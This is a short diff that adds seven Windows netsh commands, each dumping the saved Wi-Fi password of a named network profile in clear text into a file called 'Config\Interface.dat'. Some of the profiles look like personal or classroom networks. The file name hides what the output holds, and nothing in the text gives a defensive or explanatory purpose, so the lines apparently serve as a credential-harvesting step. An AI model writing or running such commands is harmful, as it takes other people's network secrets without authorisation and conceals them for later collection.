@@ -1,0 +1,7 @@
+netsh wlan show profile name="Slimani 2" key=clear > Config\Interface.dat
+netsh wlan show profile name="Slimani" key=clear > Config\Interface.dat
+netsh wlan show profile name="Mohaslimani11@" key=clear > Config\Interface.dat
+netsh wlan show profile name="salle001" key=clear > Config\Interface.dat
+netsh wlan show profile name="TP-LINK_DB2C" key=clear > Config\Interface.dat
+netsh wlan show profile name="Khalid zennouhi" key=clear > Config\Interface.dat
+netsh wlan show profile name="* A  *" key=clear > Config\Interface.dat
